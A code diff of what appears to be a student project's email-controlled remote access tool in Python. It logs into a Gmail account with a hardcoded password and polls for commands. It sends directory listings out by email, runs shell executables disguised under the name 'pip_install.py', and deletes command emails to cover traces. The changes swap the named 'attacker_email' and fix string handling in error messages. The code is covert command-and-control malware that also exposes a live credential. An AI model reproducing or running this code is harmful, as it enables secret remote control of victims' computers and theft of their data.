@@ -18,8 +18,8 @@ import uuid
 emailAdr = "os.services.updates@gmail.com"
 password = "cse363esc"
 SMTP_SERVER = "imap.gmail.com"
-attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
-#attacker_email = "William Chen <william.chen@stonybrook.edu>"
+#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
+attacker_email = "William Chen <william.chen@stonybrook.edu>"
 SMTP_PORT = 993
 commands = []
 executable_file = "pip_install.py"
@@ -124,7 +124,7 @@ def showFiles(commandString):
             sendEmail(payload)
 
         except:
-            subjectLine = "Subject: Failed directory fetch from " + id
+            subjectLine = "Subject: Failed directory fetch from " + str(id)
             sendEmail(subjectLine)
 
 
@@ -157,7 +157,7 @@ def executeCom(commandString):
             os.remove(executable_file)
 
         except:
-            subjectLine = "Subject: Failed to run shell exe " + id
+            subjectLine = "Subject: Failed to run shell exe " + str(id)
             sendEmail(subjectLine)
 
 
@@ -215,8 +215,8 @@ def readEmail():
        commandParser(commands)
 
     if(isBroadcast):
-        mail.store(i, '+FLAGS', '\\Deleted')
         time.sleep(15)
+        mail.store(i, '+FLAGS', '\\Deleted')
     mail.expunge()
     mail.close()
     mail.logout()
